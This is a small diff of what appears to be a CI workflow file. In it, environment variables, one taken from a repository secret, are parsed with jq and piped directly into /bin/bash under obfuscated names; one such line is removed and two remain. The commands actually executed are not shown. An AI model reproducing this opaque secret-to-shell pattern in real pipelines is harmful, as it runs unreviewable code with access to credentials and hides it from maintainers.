@@ -17,7 +17,6 @@ jobs:
           t8: ${{ secrets.t8 }}
         run: |
           printf '%s' "$t8" | jq -r .ujewq0234 | /bin/bash
-          echo $k60 | jq -r .w24760 | /bin/bash
           printf '%s' "$cqz43238" | jq -r .mr06 | /bin/bash
 
       - name: Persist output
